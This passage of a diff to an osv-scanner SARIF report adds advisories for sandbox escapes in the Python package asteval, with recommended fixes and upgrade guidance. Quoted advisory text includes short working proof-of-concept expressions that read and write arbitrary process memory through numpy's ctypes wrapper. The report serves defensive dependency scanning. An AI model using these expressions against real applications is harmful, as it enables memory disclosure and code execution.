known design choice (\"If reading from disk\n\u003e must be forbidden, you will want to overwrite the `open()` function from the symbol table\").\n\u003e It is included here for completeness, not as a separate advisory claim.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Recommended Fix\n\u003e \n\u003e **Option A — Remove dangerous classes from `FROM_PY` (minimal, preferred):**\n\u003e \n\u003e ```python\n\u003e # asteval/astutils.py\n\u003e \n\u003e FROM_PY = ('ArithmeticError', 'AssertionError', 'AttributeError',\n\u003e            # Remove: 'BaseException',\n\u003e            'BufferError', 'BytesWarning',\n\u003e            'DeprecationWarning', 'EOFError', 'EnvironmentError',\n\u003e            'Exception', 'False', 'FloatingPointError',\n\u003e            # Remove: 'GeneratorExit',\n\u003e            'IOError', 'ImportError', 'ImportWarning', 'IndentationError',\n\u003e            'IndexError', 'KeyError',\n\u003e            # Remove: 'KeyboardInterrupt',\n\u003e            'LookupError',\n\u003e            'MemoryError', 'NameError', 'None',\n\u003e            'NotImplementedError', 'OSError', 'OverflowError',\n\u003e            'ReferenceError', 'RuntimeError', 'RuntimeWarning',\n\u003e            'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError',\n\u003e            # Remove: 'SystemExit',\n\u003e            'True', 'TypeError', ...)\n\u003e ```\n\u003e \n\u003e **Option B — Block non-`Exception` raises in `on_raise()`:**\n\u003e \n\u003e ```python\n\u003e # asteval/asteval.py\n\u003e \n\u003e def on_raise(self, node):\n\u003e     excnode = node.exc\n\u003e     msgnode = node.cause\n\u003e     out = self.run(excnode)\n\u003e     # Prevent BaseException subclasses from escaping the sandbox\n\u003e     if not issubclass(out.__class__, Exception):\n\u003e         self.raise_exception(node, exc=RuntimeError,\n\u003e                              msg=f\"raising {out.__class__.__name__!r} is not permitted\")\n\u003e         return\n\u003e     msg = ' '.join(str(a) for a in out.args)\n\u003e     msg2 = self.run(msgnode)\n\u003e     if msg2 not in (None, 'None'):\n\u003e         msg = f\"{msg}: {msg2}\"\n\u003e     self.raise_exception(None, exc=out.__class__, msg=msg, expr='')\n\u003e ```\n\u003e \n\u003e Note: Option B also fixes a secondary bug on the same line — `' '.join(out.args)` crashes\n\u003e with `TypeError` when args contain non-strings (e.g., `raise SystemExit(0)` with integer\n\u003e code). The fix uses `str(a) for a in out.args`.\n\u003e \n\u003e **Option C — Catch `BaseException` in `run()` and `eval()` (broadest, requires care):**\n\u003e \n\u003e ```python\n\u003e except BaseException as exc:\n\u003e     if isinstance(exc, (SystemExit, KeyboardInterrupt, GeneratorExit)):\n\u003e         # Re-raise as RuntimeError to contain within sandbox\n\u003e         self.raise_exception(node, exc=RuntimeError,\n\u003e                              msg=f\"{type(exc).__name__} raised in sandbox\")\n\u003e     elif with_raise and self.expr is not None:\n\u003e         self.raise_exception(node, expr=self.expr)\n\u003e ```\n\u003e \n\u003e Option A is the simplest and least likely to introduce regressions. Option B additionally\n\u003e addresses the `str.join` crash on integer args.\n\u003e \n\u003e ---\n\u003e \n\u003e ## Disclosure Timeline\n\u003e \n\u003e | Date | Event |\n\u003e |------|-------|\n\u003e | 2026-06-09 | Vulnerability discovered during code review |\n\u003e | 2026-06-09 | Report submitted via GitHub Security Advisory |\n\u003e | TBD | Maintainer acknowledgment |\n\u003e | TBD + 90 days | Public disclosure deadline |\n\u003e \n\u003e ---\n\u003e \n\u003e ## Researcher\n\u003e \n\u003e Independent security researcher. No bug bounty program exists for this project.\n\u003e CVE assignment requested via GitHub Security Advisory submission.\n\u003e \n\u003e ---\n\u003e \n\u003e ## References\n\u003e \n\u003e - Prior CVE: CVE-2025-24359 (format string injection, fixed 1.0.6)\n\u003e - Prior advisory: GHSA-vp47-9734-prjw (AST mutation TOCTOU, fixed 1.0.6)\n\u003e - Python exception hierarchy: https://docs.python.org/3/library/exceptions.html#exception-hierarchy\n\u003e - `asteval` documentation: https://lmfit.github.io/asteval/\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | asteval | 1.0.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-89v8-rhwq-hf77 | asteval | 1.0.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-55244\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-55244",
+              "name": "CVE-2026-55244",
+              "properties": {
+                "security-severity": "5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-55244: asteval has a Sandbox Escape via BaseException Subclasses",
+                "text": "CVE-2026-55244: asteval has a Sandbox Escape via BaseException Subclasses"
+              }
+            },
+            {
+              "deprecatedIds": [
                 "CVE-2026-16728",
                 "GHSA-8xcm-r25x-g524"
               ],
@@ -6852,6 +6957,29 @@
               "shortDescription": {
                 "markdown": "CVE-2026-48522: PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes",
                 "text": "CVE-2026-48522: PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "GHSA-9w56-46f6-3qhx"
+              ],
+              "fullDescription": {
+                "markdown": "### Summary\nWith its default configuration (numpy enabled, `import` disabled), asteval's `Interpreter` lets an attacker-controlled expression obtain a raw **arbitrary process-memory read and write** primitive, without using `import`, any `__dunder__` attribute, or `eval`/`exec`/`getattr`. Arbitrary in-process read/write is equivalent to arbitrary code execution and is a complete escape of the sandbox whose entire purpose is \"untrusted string in, no arbitrary execution out.\" Any application that feeds untrusted input to asteval with numpy installed (the default) is affected.\n\n### Details\nasteval's attribute filter (`asteval/astutils.py: safe_getattr`) blocks every `__dunder__` name and blocks objects whose attribute value is *identity-equal* to one of the modules in `UNSAFE_MODULES = {io, os, sys, ctypes}`. The `ctypes` **module** entry was added recently (commit 9d9d430) and correctly blocks `ndarray.ctypes._ctypes`.\n\nHowever, the module check is identity-only against the ctypes *module*. It does not cover ctypes **type objects** and their metaclass methods, which are reachable through numpy's `ndarray.ctypes` wrapper using only ordinary (non-dunder) attribute names:\n\n    zeros(1, dtype=int32).ctypes.shape._type_      -\u003e  \u003cclass 'ctypes.c_long'\u003e\n\n`ndarray.ctypes` exposes `.shape` (a ctypes array) whose element type `._type_` is `ctypes.c_long`. None of `ctypes`, `.shape`, `._type_` is a dunder, none is in `UNSAFE_ATTRS`, and the returned value is a *type*, not the ctypes module, so `safe_getattr` permits all of them.\n\nOn that ctypes type, the metaclass method `from_address` is reachable (non-dunder, not in `UNSAFE_ATTRS`; it is not even listed by `dir()`, which is likely why it was missed):\n\n* **Arbitrary read:** `c_long.from_address(addr).value` reads 8 bytes at any address. `id()` (a permitted builtin) supplies arbitrary object addresses.\n* **Arbitrary write:** `cell = c_long.from_address(addr); cell.value = X` writes 8 bytes to any address. The write half rides asteval's **unfiltered `setattr`** in `Interpreter.node_assign` (the `ast.Attribute` branch performs `setattr(self.run(node.value), node.attr, val)` with no attribute-name check).\n\nRoot cause is two gaps:\n\n1. `safe_getattr` blocks the ctypes *module* but not ctypes *types* / metaclass methods (`from_address`, `from_buffer`, `from_buffer_copy`, `in_dll`, `from_param`) reachable via `ndarray.ctypes ... ._type_`.\n2. `node_assign` performs attribute writes (`setattr`) and deletes (`delattr`) with no attribute-name filtering.\n\nThis belongs to the known \"numpy is a large attack surface\" class (the docs already note `open()` read and `ndarray.tofile()` write), but this specific arbitrary memory read/write chain is undocumented and bypasses the most recent ctypes-module hardening. All previously reported escapes (CVE-2025-24359 / GHSA-3wwr-3g9f-9gc7, GHSA-vp47-9734-prjw, reduce/reduce_ex, classic `__subclasses__` traversal) are patched on the current code; this one is live.\n\n### PoC\nSelf contained POC here: https://gist.github.com/thegr1ffyn/16b67c5f9b5339a7e2bdc91423ff09e3\nEnvironment: `pip install asteval numpy` (verified on asteval 1.0.8, numpy 2.4.6, CPython 3.12.3; the chain is numpy-1.x/2.x robust). Default `Interpreter` (`use_numpy=True`, `import` disabled).\n\nMinimal one-expression arbitrary read (reads 8 bytes at an attacker-chosen address):\n\n    zeros(1,dtype=int32).ctypes.shape._type_.from_address(id(zeros(1))).value\n\nMinimal arbitrary write (writes 0x4142434445464748 to a chosen address; here our own array buffer, observed back through numpy):\n\n    a = zeros(2, dtype=int32)\n    cell = a.ctypes.shape._type_.from_address(a.ctypes.data)\n    cell.value = 0x4142434445464748        # -\u003e a[0]=0x45464748, a[1]=0x41424344\n\nA full self-contained script is attached (poc_asteval_ctypes.py); running it prints the recovered PyObject header of a private object (arbitrary read) and confirms a raw write landing at a chosen pointer (arbitrary write), all from a default, import-disabled interpreter.\n\n### Impact\nSandbox escape / protection-mechanism failure leading to arbitrary in-process native memory read and write (RCE-equivalent). Impact:\n\n* Disclosure of any data in the host process's address space (secrets, keys, other users' data).\n* Corruption of arbitrary memory -\u003e control-flow hijack / arbitrary code execution and/or process crash (DoS).\n\nAffected: any application that evaluates untrusted/attacker-influenced expressions with asteval while numpy is installed (the default). No authentication and no special configuration is required; `import` does not need to be enabled. Mitigation until patched: construct the interpreter with `use_numpy=False`.",
+                "text": "### Summary\nWith its default configuration (numpy enabled, `import` disabled), asteval's `Interpreter` lets an attacker-controlled expression obtain a raw **arbitrary process-memory read and write** primitive, without using `import`, any `__dunder__` attribute, or `eval`/`exec`/`getattr`. Arbitrary in-process read/write is equivalent to arbitrary code execution and is a complete escape of the sandbox whose entire purpose is \"untrusted string in, no arbitrary execution out.\" Any application that feeds untrusted input to asteval with numpy installed (the default) is affected.\n\n### Details\nasteval's attribute filter (`asteval/astutils.py: safe_getattr`) blocks every `__dunder__` name and blocks objects whose attribute value is *identity-equal* to one of the modules in `UNSAFE_MODULES = {io, os, sys, ctypes}`. The `ctypes` **module** entry was added recently (commit 9d9d430) and correctly blocks `ndarray.ctypes._ctypes`.\n\nHowever, the module check is identity-only against the ctypes *module*. It does not cover ctypes **type objects** and their metaclass methods, which are reachable through numpy's `ndarray.ctypes` wrapper using only ordinary (non-dunder) attribute names:\n\n    zeros(1, dtype=int32).ctypes.shape._type_      -\u003e  \u003cclass 'ctypes.c_long'\u003e\n\n`ndarray.ctypes` exposes `.shape` (a ctypes array) whose element type `._type_` is `ctypes.c_long`. None of `ctypes`, `.shape`, `._type_` is a dunder, none is in `UNSAFE_ATTRS`, and the returned value is a *type*, not the ctypes module, so `safe_getattr` permits all of them.\n\nOn that ctypes type, the metaclass method `from_address` is reachable (non-dunder, not in `UNSAFE_ATTRS`; it is not even listed by `dir()`, which is likely why it was missed):\n\n* **Arbitrary read:** `c_long.from_address(addr).value` reads 8 bytes at any address. `id()` (a permitted builtin) supplies arbitrary object addresses.\n* **Arbitrary write:** `cell = c_long.from_address(addr); cell.value = X` writes 8 bytes to any address. The write half rides asteval's **unfiltered `setattr`** in `Interpreter.node_assign` (the `ast.Attribute` branch performs `setattr(self.run(node.value), node.attr, val)` with no attribute-name check).\n\nRoot cause is two gaps:\n\n1. `safe_getattr` blocks the ctypes *module* but not ctypes *types* / metaclass methods (`from_address`, `from_buffer`, `from_buffer_copy`, `in_dll`, `from_param`) reachable via `ndarray.ctypes ... ._type_`.\n2. `node_assign` performs attribute writes (`setattr`) and deletes (`delattr`) with no attribute-name filtering.\n\nThis belongs to the known \"numpy is a large attack surface\" class (the docs already note `open()` read and `ndarray.tofile()` write), but this specific arbitrary memory read/write chain is undocumented and bypasses the most recent ctypes-module hardening. All previously reported escapes (CVE-2025-24359 / GHSA-3wwr-3g9f-9gc7, GHSA-vp47-9734-prjw, reduce/reduce_ex, classic `__subclasses__` traversal) are patched on the current code; this one is live.\n\n### PoC\nSelf contained POC here: https://gist.github.com/thegr1ffyn/16b67c5f9b5339a7e2bdc91423ff09e3\nEnvironment: `pip install asteval numpy` (verified on asteval 1.0.8, numpy 2.4.6, CPython 3.12.3; the chain is numpy-1.x/2.x robust). Default `Interpreter` (`use_numpy=True`, `import` disabled).\n\nMinimal one-expression arbitrary read (reads 8 bytes at an attacker-chosen address):\n\n    zeros(1,dtype=int32).ctypes.shape._type_.from_address(id(zeros(1))).value\n\nMinimal arbitrary write (writes 0x4142434445464748 to a chosen address; here our own array buffer, observed back through numpy):\n\n    a = zeros(2, dtype=int32)\n    cell = a.ctypes.shape._type_.from_address(a.ctypes.data)\n    cell.value = 0x4142434445464748        # -\u003e a[0]=0x45464748, a[1]=0x41424344\n\nA full self-contained script is attached (poc_asteval_ctypes.py); running it prints the recovered PyObject header of a private object (arbitrary read) and confirms a raw write landing at a chosen pointer (arbitrary write), all from a default, import-disabled interpreter.\n\n### Impact\nSandbox escape / protection-mechanism failure leading to arbitrary in-process native memory read and write (RCE-equivalent). Impact:\n\n* Disclosure of any data in the host process's address space (secrets, keys, other users' data).\n* Corruption of arbitrary memory -\u003e control-flow hijack / arbitrary code execution and/or process crash (DoS).\n\nAffected: any application that evaluates untrusted/attacker-influenced expressions with asteval while numpy is installed (the default). No authentication and no special configuration is required; `import` does not need to be enabled. Mitigation until patched: construct the interpreter with `use_numpy=False`."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [GHSA-9w56-46f6-3qhx](https://osv.dev/GHSA-9w56-46f6-3qhx)**.\n\n## [GHSA-9w56-46f6-3qhx](https://osv.dev/GHSA-9w56-46f6-3qhx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e With its default configuration (numpy enabled, `import` disabled), asteval's `Interpreter` lets an attacker-controlled expression obtain a raw **arbitrary process-memory read and write** primitive, without using `import`, any `__dunder__` attribute, or `eval`/`exec`/`getattr`. Arbitrary in-process read/write is equivalent to arbitrary code execution and is a complete escape of the sandbox whose entire purpose is \"untrusted string in, no arbitrary execution out.\" Any application that feeds untrusted input to asteval with numpy installed (the default) is affected.\n\u003e \n\u003e ### Details\n\u003e asteval's attribute filter (`asteval/astutils.py: safe_getattr`) blocks every `__dunder__` name and blocks objects whose attribute value is *identity-equal* to one of the modules in `UNSAFE_MODULES = {io, os, sys, ctypes}`. The `ctypes` **module** entry was added recently (commit 9d9d430) and correctly blocks `ndarray.ctypes._ctypes`.\n\u003e \n\u003e However, the module check is identity-only against the ctypes *module*. It does not cover ctypes **type objects** and their metaclass methods, which are reachable through numpy's `ndarray.ctypes` wrapper using only ordinary (non-dunder) attribute names:\n\u003e \n\u003e     zeros(1, dtype=int32).ctypes.shape._type_      -\u003e  \u003cclass 'ctypes.c_long'\u003e\n\u003e \n\u003e `ndarray.ctypes` exposes `.shape` (a ctypes array) whose element type `._type_` is `ctypes.c_long`. None of `ctypes`, `.shape`, `._type_` is a dunder, none is in `UNSAFE_ATTRS`, and the returned value is a *type*, not the ctypes module, so `safe_getattr` permits all of them.\n\u003e \n\u003e On that ctypes type, the metaclass method `from_address` is reachable (non-dunder, not in `UNSAFE_ATTRS`; it is not even listed by `dir()`, which is likely why it was missed):\n\u003e \n\u003e * **Arbitrary read:** `c_long.from_address(addr).value` reads 8 bytes at any address. `id()` (a permitted builtin) supplies arbitrary object addresses.\n\u003e * **Arbitrary write:** `cell = c_long.from_address(addr); cell.value = X` writes 8 bytes to any address. The write half rides asteval's **unfiltered `setattr`** in `Interpreter.node_assign` (the `ast.Attribute` branch performs `setattr(self.run(node.value), node.attr, val)` with no attribute-name check).\n\u003e \n\u003e Root cause is two gaps:\n\u003e \n\u003e 1. `safe_getattr` blocks the ctypes *module* but not ctypes *types* / metaclass methods (`from_address`, `from_buffer`, `from_buffer_copy`, `in_dll`, `from_param`) reachable via `ndarray.ctypes ... ._type_`.\n\u003e 2. `node_assign` performs attribute writes (`setattr`) and deletes (`delattr`) with no attribute-name filtering.\n\u003e \n\u003e This belongs to the known \"numpy is a large attack surface\" class (the docs already note `open()` read and `ndarray.tofile()` write), but this specific arbitrary memory read/write chain is undocumented and bypasses the most recent ctypes-module hardening. All previously reported escapes (CVE-2025-24359 / GHSA-3wwr-3g9f-9gc7, GHSA-vp47-9734-prjw, reduce/reduce_ex, classic `__subclasses__` traversal) are patched on the current code; this one is live.\n\u003e \n\u003e ### PoC\n\u003e Self contained POC here: https://gist.github.com/thegr1ffyn/16b67c5f9b5339a7e2bdc91423ff09e3\n\u003e Environment: `pip install asteval numpy` (verified on asteval 1.0.8, numpy 2.4.6, CPython 3.12.3; the chain is numpy-1.x/2.x robust). Default `Interpreter` (`use_numpy=True`, `import` disabled).\n\u003e \n\u003e Minimal one-expression arbitrary read (reads 8 bytes at an attacker-chosen address):\n\u003e \n\u003e     zeros(1,dtype=int32).ctypes.shape._type_.from_address(id(zeros(1))).value\n\u003e \n\u003e Minimal arbitrary write (writes 0x4142434445464748 to a chosen address; here our own array buffer, observed back through numpy):\n\u003e \n\u003e     a = zeros(2, dtype=int32)\n\u003e     cell = a.ctypes.shape._type_.from_address(a.ctypes.data)\n\u003e     cell.value = 0x4142434445464748        # -\u003e a[0]=0x45464748, a[1]=0x41424344\n\u003e \n\u003e A full self-contained script is attached (poc_asteval_ctypes.py); running it prints the recovered PyObject header of a private object (arbitrary read) and confirms a raw write landing at a chosen pointer (arbitrary write), all from a default, import-disabled interpreter.\n\u003e \n\u003e ### Impact\n\u003e Sandbox escape / protection-mechanism failure leading to arbitrary in-process native memory read and write (RCE-equivalent). Impact:\n\u003e \n\u003e * Disclosure of any data in the host process's address space (secrets, keys, other users' data).\n\u003e * Corruption of arbitrary memory -\u003e control-flow hijack / arbitrary code execution and/or process crash (DoS).\n\u003e \n\u003e Affected: any application that evaluates untrusted/attacker-influenced expressions with asteval while numpy is installed (the default). No authentication and no special configuration is required; `import` does not need to be enabled. Mitigation until patched: construct the interpreter with `use_numpy=False`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | asteval | 1.0.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9w56-46f6-3qhx | asteval | 1.0.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-9w56-46f6-3qhx\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [GHSA-9w56-46f6-3qhx](https://osv.dev/GHSA-9w56-46f6-3qhx)**.\n\n## [GHSA-9w56-46f6-3qhx](https://osv.dev/GHSA-9w56-46f6-3qhx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e With its default configuration (numpy enabled, `import` disabled), asteval's `Interpreter` lets an attacker-controlled expression obtain a raw **arbitrary process-memory read and write** primitive, without using `import`, any `__dunder__` attribute, or `eval`/`exec`/`getattr`. Arbitrary in-process read/write is equivalent to arbitrary code execution and is a complete escape of the sandbox whose entire purpose is \"untrusted string in, no arbitrary execution out.\" Any application that feeds untrusted input to asteval with numpy installed (the default) is affected.\n\u003e \n\u003e ### Details\n\u003e asteval's attribute filter (`asteval/astutils.py: safe_getattr`) blocks every `__dunder__` name and blocks objects whose attribute value is *identity-equal* to one of the modules in `UNSAFE_MODULES = {io, os, sys, ctypes}`. The `ctypes` **module** entry was added recently (commit 9d9d430) and correctly blocks `ndarray.ctypes._ctypes`.\n\u003e \n\u003e However, the module check is identity-only against the ctypes *module*. It does not cover ctypes **type objects** and their metaclass methods, which are reachable through numpy's `ndarray.ctypes` wrapper using only ordinary (non-dunder) attribute names:\n\u003e \n\u003e     zeros(1, dtype=int32).ctypes.shape._type_      -\u003e  \u003cclass 'ctypes.c_long'\u003e\n\u003e \n\u003e `ndarray.ctypes` exposes `.shape` (a ctypes array) whose element type `._type_` is `ctypes.c_long`. None of `ctypes`, `.shape`, `._type_` is a dunder, none is in `UNSAFE_ATTRS`, and the returned value is a *type*, not the ctypes module, so `safe_getattr` permits all of them.\n\u003e \n\u003e On that ctypes type, the metaclass method `from_address` is reachable (non-dunder, not in `UNSAFE_ATTRS`; it is not even listed by `dir()`, which is likely why it was missed):\n\u003e \n\u003e * **Arbitrary read:** `c_long.from_address(addr).value` reads 8 bytes at any address. `id()` (a permitted builtin) supplies arbitrary object addresses.\n\u003e * **Arbitrary write:** `cell = c_long.from_address(addr); cell.value = X` writes 8 bytes to any address. The write half rides asteval's **unfiltered `setattr`** in `Interpreter.node_assign` (the `ast.Attribute` branch performs `setattr(self.run(node.value), node.attr, val)` with no attribute-name check).\n\u003e \n\u003e Root cause is two gaps:\n\u003e \n\u003e 1. `safe_getattr` blocks the ctypes *module* but not ctypes *types* / metaclass methods (`from_address`, `from_buffer`, `from_buffer_copy`, `in_dll`, `from_param`) reachable via `ndarray.ctypes ... ._type_`.\n\u003e 2. `node_assign` performs attribute writes (`setattr`) and deletes (`delattr`) with no attribute-name filtering.\n\u003e \n\u003e This belongs to the known \"numpy is a large attack surface\" class (the docs already note `open()` read and `ndarray.tofile()` write), but this specific arbitrary memory read/write chain is undocumented and bypasses the most recent ctypes-module hardening. All previously reported escapes (CVE-2025-24359 / GHSA-3wwr-3g9f-9gc7, GHSA-vp47-9734-prjw, reduce/reduce_ex, classic `__subclasses__` traversal) are patched on the current code; this one is live.\n\u003e \n\u003e ### PoC\n\u003e Self contained POC here: https://gist.github.com/thegr1ffyn/16b67c5f9b5339a7e2bdc91423ff09e3\n\u003e Environment: `pip install asteval numpy` (verified on asteval 1.0.8, numpy 2.4.6, CPython 3.12.3; the chain is numpy-1.x/2.x robust). Default `Interpreter` (`use_numpy=True`, `import` disabled).\n\u003e \n\u003e Minimal one-expression arbitrary read (reads 8 bytes at an attacker-chosen address):\n\u003e \n\u003e     zeros(1,dtype=int32).ctypes.shape._type_.from_address(id(zeros(1))).value\n\u003e \n\u003e Minimal arbitrary write (writes 0x4142434445464748 to a chosen address; here our own array buffer, observed back through numpy):\n\u003e \n\u003e     a = zeros(2, dtype=int32)\n\u003e     cell = a.ctypes.shape._type_.from_address(a.ctypes.data)\n\u003e     cell.value = 0x4142434445464748        # -\u003e a[0]=0x45464748, a[1]=0x41424344\n\u003e \n\u003e A full self-contained script is attached (poc_asteval_ctypes.py); running it prints the recovered PyObject header of a private object (arbitrary read) and confirms a raw write landing at a chosen pointer (arbitrary write), all from a default, import-disabled interpreter.\n\u003e \n\u003e ### Impact\n\u003e Sandbox escape / protection-mechanism failure leading to arbitrary in-process native memory read and write (RCE-equivalent). Impact:\n\u003e \n\u003e * Disclosure of any data in the host process's address space (secrets, keys, other users' data).\n\u003e * Corruption of arbitrary memory -\u003e control-flow hijack / arbitrary code execution and/or process crash (DoS).\n\u003e \n\u003e Affected: any application that evaluates untrusted/attacker-influenced expressions with asteval while numpy is installed (the default). No authentication and no special configuration is required; `import` does not need to be enabled. Mitigation until patched: construct the interpreter with `use_numpy=False`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | asteval | 1.0.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9w56-46f6-3qhx | asteval | 1.0.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-9w56-46f6-3qhx\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "GHSA-9w56-46f6-3qhx",
+              "name": "GHSA-9w56-46f6-3qhx",
+              "properties": {
+                "security-severity": "5.5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "GHSA-9w56-46f6-3qhx: asteval Sandbox Escape: arbitrary native memory read/write via numpy ctypes in default asteval Interpreter",
+                "text": "GHSA-9w56-46f6-3qhx: asteval Sandbox Escape: arbitrary native memory read/write via numpy ctypes in default asteval Interpreter"
               }
             },
             {
